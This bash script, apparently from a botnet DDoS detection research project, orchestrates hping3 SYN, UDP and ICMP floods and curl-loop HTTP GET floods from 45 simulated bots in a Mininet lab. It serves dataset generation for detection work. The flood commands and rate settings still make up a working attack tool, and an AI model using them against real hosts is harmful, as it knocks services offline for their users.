#!/usr/bin/env bash
#
# traffic/attack_scripts.sh
# ============================================================================
# DDoS attack orchestration for the
# Behavioral-Analysis-and-Detection-of-Simulated-Botnet-Based-DDoS-Traffic
# project.
#
# Launches hping3-based attacks from EVERY bot namespace (botA1..botE15,
# 45 bots total across ISP-A..ISP-E) against the victim target
# (10.0.100.10). ISP-F has no bots -- it stays clean and acts as the
# analysis control group.
#
# Intensity is controlled by hping3's "-i u<microseconds>" flag:
#     -i u20000  ->  1 pkt / 20000 us  =   50 pps per bot
#     -i u5000   ->  1 pkt /  5000 us  =  200 pps per bot
#     -i u1250   ->  1 pkt /  1250 us  =  800 pps per bot
# Each attack is also wrapped in `timeout <duration>` so every hping3
# process self-terminates at the end of the scenario, even if the
# orchestrator is killed.
#
# Scenarios:
#     low          SYN flood :80, ~50 pps/bot   (~2.25 kpps aggregate)
#     medium       SYN flood :80, ~200 pps/bot  (~9 kpps aggregate)
#     high         SYN flood :80, ~800 pps/bot  (~36 kpps aggregate)
#     udp-low      UDP flood :53 (512 B), ~100 pps/bot
#     udp-medium   UDP flood :53 (512 B), ~300 pps/bot
#     udp-high     UDP flood :53 (512 B), ~800 pps/bot
#     icmp         ICMP echo flood, ~200 pps/bot
#     http-low     HTTP GET flood :80, 1 curl loop  per bot  (L7)
#     http-medium  HTTP GET flood :80, 3 curl loops per bot  (L7)
#     http-high    HTTP GET flood :80, 6 curl loops per bot  (L7)
#     mixed        SYN + UDP + ICMP simultaneously, split across 3 bot groups
#
# Must run on the VM HOST SHELL (NOT inside the Mininet CLI) with root
# privileges, while the Mininet topology from topology/topo.py is up.
#
# Usage:
#     sudo traffic/attack_scripts.sh <scenario> [duration_seconds]
#     sudo traffic/attack_scripts.sh stop
#     sudo traffic/attack_scripts.sh list
#     sudo traffic/attack_scripts.sh status
#
# Prerequisites on the VM:
#     sudo apt-get install -y hping3 coreutils
#
# Default duration = 60 s.
# ============================================================================

set -u

# --------------------------------------------------------------------------
# Configuration
# --------------------------------------------------------------------------
export TARGET="${TARGET:-10.0.100.10}"

PIDFILE=/tmp/attack.pids
LOGDIR=/tmp/attack-logs
LOGFILE=/tmp/attack.log
DEFAULT_DURATION=60

# All 45 bots as created by topology/topo.py. Keep in the exact order
# ISP-A .. ISP-E (14 + 2 + 9 + 5 + 15) so that the "mixed" scenario
# carves the bot list into three balanced groups.
BOTS_ALL=(
    botA1  botA2  botA3  botA4  botA5  botA6  botA7
    botA8  botA9  botA10 botA11 botA12 botA13 botA14
    botB1  botB2
    botC1  botC2  botC3  botC4  botC5  botC6  botC7  botC8  botC9
    botD1  botD2  botD3  botD4  botD5
    botE1  botE2  botE3  botE4  botE5  botE6  botE7
    botE8  botE9  botE10 botE11 botE12 botE13 botE14 botE15
)

# --------------------------------------------------------------------------
# Helpers
# --------------------------------------------------------------------------
log() {
    printf '[%s] %s\n' "$(date +%H:%M:%S)" "$*" | tee -a "$LOGFILE"
}

require_root() {
    if [[ $EUID -ne 0 ]]; then
        echo "ERROR: must be run as root (sudo)." >&2
        exit 1
    fi
}

require_mnexec() {
    if ! command -v mnexec >/dev/null 2>&1; then
        echo "ERROR: mnexec not found. Is Mininet installed on this VM?" >&2
        exit 1
    fi
}

require_hping3() {
    if ! command -v hping3 >/dev/null 2>&1; then
        echo "ERROR: hping3 is not installed on this VM." >&2
        echo "       Install it with:  sudo apt-get install -y hping3" >&2
        exit 1
    fi
}

require_timeout() {
    if ! command -v timeout >/dev/null 2>&1; then
        echo "ERROR: coreutils 'timeout' command not found." >&2
        exit 1
    fi
}

# Return the PID of the bash shell for Mininet host $1, or empty.
# Mininet names each host shell "mininet:<host>" via argv[0], so an end
# anchor (\$) is required so that "botA1" doesn't match "botA10" etc.
ns_pid() {
    pgrep -f "mininet:$1\$" 2>/dev/null | head -n 1 || true
}

require_topology() {
    if [[ -z "$(ns_pid target)" ]]; then
        echo "ERROR: Mininet topology is not running." >&2
        echo "       Start it first in another terminal:" >&2
        echo "           sudo python3 topology/topo.py" >&2
        exit 1
    fi
}

# --------------------------------------------------------------------------
# Core attack launcher
# --------------------------------------------------------------------------
# launch_attack LABEL DURATION -- <hping3 args...>
#
# Iterates over the BOTS array (which the caller sets, possibly to a
# subset of BOTS_ALL via `local BOTS=(...)` -- bash's dynamic scoping lets
# this function see it) and launches one hping3 inside each bot's
# network namespace via mnexec + timeout. Tracks every spawned mnexec
# PID in $PIDFILE for later cleanup, and writes per-bot output to
# $LOGDIR/<bot>.<label>.log.
launch_attack() {
    local label="$1" duration="$2"
    shift 2
    [[ "${1:-}" == "--" ]] && shift

    mkdir -p "$LOGDIR"

    local launched=0 missing=0 h pid
    for h in "${BOTS[@]}"; do
        pid="$(ns_pid "$h")"
        if [[ -z "$pid" ]]; then
            missing=$((missing+1))
            log "  WARN: $h namespace not found, skipping"
            continue
        fi
        # `timeout` self-kills hping3 after <duration>s even if this
        # orchestrator is interrupted.
        mnexec -a "$pid" timeout "$duration" hping3 "$@" "$TARGET" \
            >>"$LOGDIR/$h.$label.log" 2>&1 &
        echo $! >> "$PIDFILE"
        launched=$((launched+1))
    done
    log "  $label : $launched/${#BOTS[@]} bots launched (missing=$missing) args='$*'"
}

# --------------------------------------------------------------------------
# HTTP (L7) flood launcher
# --------------------------------------------------------------------------
# launch_http_flood LABEL DURATION WORKERS_PER_BOT
#
# Spawns WORKERS_PER_BOT concurrent curl loops inside each bot's namespace.
# Unlike the hping3 scenarios (which craft L3/L4 packets directly), this
# one produces FULL TCP+HTTP conversations -- real 3-way handshakes, real
# GET requests, real responses or connection resets -- so the resulting
# pcap contains L7 features (HTTP verbs, headers, per-request timing) that
# a SYN flood cannot. This is what makes it a "web DDoS" vector.
#
# For meaningful L7 behaviour the target must be running an HTTP listener
# on :80. The easiest way is to run `traffic/normal_traffic.sh start`
# beforehand, which brings up python3 -m http.server 80 on target.
# Without a listener the flood degenerates into a SYN/RST storm (still
# captured, just less L7-interesting).
#
# Each worker is wrapped in `timeout -k 2 <duration>` so it self-terminates
# at the end of the scenario even if the orchestrator is killed.
launch_http_flood() {
    local label="$1" duration="$2" workers="$3"

    if ! [[ "$workers" =~ ^[0-9]+$ ]] || (( workers < 1 )); then
        echo "ERROR: launch_http_flood: workers must be a positive integer (got '$workers')" >&2
        exit 2
    fi

    mkdir -p "$LOGDIR"

    local launched=0 missing=0 h pid w
    for h in "${BOTS[@]}"; do
        pid="$(ns_pid "$h")"
        if [[ -z "$pid" ]]; then
            missing=$((missing+1))
            log "  WARN: $h namespace not found, skipping"
            continue
        fi
        # N concurrent curl loops per bot. `curl --max-time 2` caps each
        # request so queued connections on an overloaded target never
        # stall the loop.  Break out of single quotes so $TARGET is
        # expanded into the bash -c argv, matching the pkill patterns in
        # stop_attacks().
        for (( w=1; w<=workers; w++ )); do
            mnexec -a "$pid" timeout -k 2 "$duration" bash -c \
                'while true; do curl -s --max-time 2 -o /dev/null "http://'"$TARGET"'/" || true; done' \
                >>"$LOGDIR/$h.$label.log" 2>&1 &
            echo $! >> "$PIDFILE"
        done
        launched=$((launched+1))
    done
    log "  $label : $launched/${#BOTS[@]} bots x $workers workers (missing=$missing) -> http://$TARGET/"
}

# --------------------------------------------------------------------------
# Scenarios
# --------------------------------------------------------------------------
run_scenario() {
    local scenario="$1"
    local duration="${2:-$DEFAULT_DURATION}"

    if ! [[ "$duration" =~ ^[0-9]+$ ]] || (( duration < 1 )); then
        echo "ERROR: duration must be a positive integer (got '$duration')" >&2
        exit 2
    fi

    require_topology
    : > "$PIDFILE"

    log "============================================================"
    log "SCENARIO: $scenario    duration: ${duration}s    target: $TARGET"
    log "bots: ${#BOTS_ALL[@]} total"
    log "============================================================"

    case "$scenario" in
        low)
            local BOTS=("${BOTS_ALL[@]}")
            launch_attack syn-low "$duration" -- -S -p 80 -i u20000
            ;;
        medium)
            local BOTS=("${BOTS_ALL[@]}")
            launch_attack syn-medium "$duration" -- -S -p 80 -i u5000
            ;;
        high)
            local BOTS=("${BOTS_ALL[@]}")
            launch_attack syn-high "$duration" -- -S -p 80 -i u1250
            ;;
        udp-low)
            local BOTS=("${BOTS_ALL[@]}")
            launch_attack udp-low "$duration" -- --udp -p 53 -d 512 -i u10000
            ;;
        udp-medium)
            local BOTS=("${BOTS_ALL[@]}")
            launch_attack udp-medium "$duration" -- --udp -p 53 -d 512 -i u3333
            ;;
        udp-high)
            local BOTS=("${BOTS_ALL[@]}")
            launch_attack udp-high "$duration" -- --udp -p 53 -d 512 -i u1250
            ;;
        icmp)
            local BOTS=("${BOTS_ALL[@]}")
            launch_attack icmp "$duration" -- --icmp -i u5000
            ;;
        http-low)
            local BOTS=("${BOTS_ALL[@]}")
            launch_http_flood http-low "$duration" 1
            ;;
        http-medium)
            local BOTS=("${BOTS_ALL[@]}")
            launch_http_flood http-medium "$duration" 3
            ;;
        http-high)
            local BOTS=("${BOTS_ALL[@]}")
            launch_http_flood http-high "$duration" 6
            ;;
        mixed)
            # Split bots into three equal-ish groups and hit the target
            # with a different L3/L4 vector from each group simultaneously.
            local n=${#BOTS_ALL[@]}
            local third=$(( n / 3 ))

            local BOTS=("${BOTS_ALL[@]:0:$third}")
            launch_attack mix-syn "$duration" -- -S -p 80 -i u5000

            local BOTS=("${BOTS_ALL[@]:$third:$third}")
            launch_attack mix-udp "$duration" -- --udp -p 53 -d 512 -i u5000

            local BOTS=("${BOTS_ALL[@]:$((third*2))}")
            launch_attack mix-icmp "$duration" -- --icmp -i u5000
            ;;
        *)
            echo "ERROR: unknown scenario '$scenario'" >&2
            print_scenarios
            exit 2
            ;;
    esac

    log "running ${duration}s ... (Ctrl-C aborts; 'stop' cleans up)"
    # Sleep a hair longer than duration so that timeout(1) can deliver
    # SIGTERM to all hping3 processes, then we reap anything left.
    sleep $((duration + 3))
    stop_attacks quiet
    log "scenario '$scenario' completed"
    echo
    echo "Per-bot logs : $LOGDIR/*.${scenario}.log  (and mix-* for 'mixed')"
    echo "Master log   : $LOGFILE"
}

# --------------------------------------------------------------------------
# Stop
# --------------------------------------------------------------------------
stop_attacks() {
    local quiet="${1:-}"
    [[ "$quiet" != "quiet" ]] && log "stopping all attacks"

    # 1. TERM every tracked mnexec supervisor.
    if [[ -f "$PIDFILE" ]]; then
        while read -r pid; do
            [[ -z "$pid" ]] && continue
            kill -TERM "$pid" 2>/dev/null || true
        done < "$PIDFILE"
        sleep 0.5
        while read -r pid; do
            [[ -z "$pid" ]] && continue
            kill -KILL "$pid" 2>/dev/null || true
        done < "$PIDFILE"
        rm -f "$PIDFILE"
    fi

    # 2. Belt-and-suspenders: kill any lingering attack tools inside each
    #    bot namespace (hping3 from the L3/L4 scenarios, curl from the
    #    http-* L7 scenarios).
    for h in "${BOTS_ALL[@]}"; do
        local pid
        pid="$(ns_pid "$h")"
        [[ -z "$pid" ]] && continue
        mnexec -a "$pid" pkill -9 -f hping3          2>/dev/null || true
        mnexec -a "$pid" pkill -9 -f "curl.*$TARGET" 2>/dev/null || true
    done

    [[ "$quiet" != "quiet" ]] && log "all attacks stopped"
}

# --------------------------------------------------------------------------
# Status / info
# --------------------------------------------------------------------------
cmd_status() {
    echo "---- attack_scripts status ----"
    echo "target:       $TARGET"
    echo "bots total:   ${#BOTS_ALL[@]}"

    if [[ -f "$PIDFILE" ]]; then
        local alive=0 dead=0
        while read -r pid; do
            [[ -z "$pid" ]] && continue
            if kill -0 "$pid" 2>/dev/null; then
                alive=$((alive+1))
            else
                dead=$((dead+1))
            fi
        done < "$PIDFILE"
        echo "supervisors:  $alive alive, $dead finished"
    else
        echo "supervisors:  no active run tracked"
    fi

    # Count attack-tool processes globally (cheap approximation; includes
    # every namespace because /proc is shared).
    local hping_count curl_count
    hping_count="$(pgrep -c -x hping3 2>/dev/null || echo 0)"
    curl_count="$(pgrep -c -f "curl.*$TARGET" 2>/dev/null || echo 0)"
    echo "hping3 procs: $hping_count   (non-zero = L3/L4 flood active)"
    echo "curl procs:   $curl_count   (http-* flood + normal_traffic combined)"
    echo "logs:         $LOGFILE  and  $LOGDIR/"
}

print_scenarios() {
    cat <<EOF

Scenarios (all target $TARGET from every bot unless noted):

    low          SYN  flood :80, ~50 pps/bot    (~2.25 kpps total)
    medium       SYN  flood :80, ~200 pps/bot   (~9 kpps total)
    high         SYN  flood :80, ~800 pps/bot   (~36 kpps total)
    udp-low      UDP  flood :53, ~100 pps/bot   (512-byte payload)
    udp-medium   UDP  flood :53, ~300 pps/bot
    udp-high     UDP  flood :53, ~800 pps/bot
    icmp         ICMP echo  flood, ~200 pps/bot
    http-low     HTTP GET flood :80, 1 curl loop  per bot   (L7, 45 conns)
    http-medium  HTTP GET flood :80, 3 curl loops per bot   (L7, 135 conns)
    http-high    HTTP GET flood :80, 6 curl loops per bot   (L7, 270 conns)
    mixed        SYN + UDP + ICMP across three equal bot groups, each
                 at ~200 pps/bot

Note: http-* scenarios need an HTTP listener on $TARGET:80. Start
      traffic/normal_traffic.sh first so target runs a Python http.server;
      without it http-* degenerates into a SYN/RST storm (still captured).

EOF
}

print_usage() {
    cat <<EOF
Usage: sudo traffic/attack_scripts.sh <scenario> [duration_seconds]
       sudo traffic/attack_scripts.sh stop
       sudo traffic/attack_scripts.sh list
       sudo traffic/attack_scripts.sh status
EOF
    print_scenarios
    cat <<EOF
Default duration = ${DEFAULT_DURATION}s.

Run this script from the VM host shell (NOT the Mininet CLI).
The Mininet topology (sudo python3 topology/topo.py) must be up first.

Recommended run order for a clean experiment:
    1. sudo python3 topology/topo.py                         # pane A
    2. sudo traffic/normal_traffic.sh start                  # pane B
    3. (optional) start a capture on Rdc-eth0 for labelling  # pane A
    4. sudo traffic/attack_scripts.sh <scenario> <duration>  # pane B
    5. sudo traffic/attack_scripts.sh stop                   # pane B
    6. sudo traffic/normal_traffic.sh stop                   # pane B
EOF
}

# --------------------------------------------------------------------------
# Main
# --------------------------------------------------------------------------
main() {
    require_root
    require_mnexec
    require_hping3
    require_timeout

    case "${1:-}" in
        ""|-h|--help|help)  print_usage ;;
        list)               print_scenarios ;;
        status)             cmd_status ;;
        stop)               stop_attacks ;;
        *)                  run_scenario "$@" ;;
    esac
}

main "$@"
